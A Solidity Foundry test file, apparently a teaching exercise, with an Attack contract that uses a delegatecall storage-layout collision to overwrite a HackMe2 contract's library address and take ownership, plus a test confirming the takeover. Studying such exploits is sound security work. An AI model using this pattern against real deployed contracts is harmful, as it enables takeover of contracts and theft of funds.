// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/HackMe2.sol";


contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe2 public hackMe;

    constructor(HackMe2 _hackMe) {
        hackMe = HackMe2(_hackMe);
    }

    function attack() public {
//         override address of lib
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}

contract HackMe2Test is Test {
    uint256 public privateKey = 1234;
    address public signer;
    HackMe2 public hackMe;
    Lib public lib;
    address public exploiter = vm.addr(3333);
    function setUp() public {
        signer = vm.addr(privateKey);
        vm.startPrank(signer);
        lib = new Lib();
        hackMe = new HackMe2(address(lib));
        vm.stopPrank();
    }

    function test_steal_owner_2() public {
        assertEq(hackMe.owner(), signer);
        vm.startPrank(exploiter);
        Attack attack = new Attack(hackMe);
        attack.attack();
        assertEq(hackMe.owner(), address(attack));
    }
}